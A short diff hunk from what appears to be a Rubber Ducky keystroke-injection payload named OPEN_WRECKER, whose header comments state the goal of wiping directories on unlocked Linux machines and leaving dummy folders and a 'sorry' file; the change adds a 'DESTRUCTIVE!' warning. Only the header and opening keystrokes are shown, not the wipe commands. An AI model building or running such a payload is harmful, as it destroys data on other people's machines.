@@ -1,7 +1,7 @@
 REM Author: FLIZZ3R
 REM TITLE: OPEN_WRECKER
 REM OBJECTIVE: wipe open linux machines Directories then create dummy directories and sorry text file
-
+REM Note from UberGuidoz - DESTRUCTIVE! USE WITH CAUTION.
 DELAY 500
 WINDOWS d
 DELAY 300
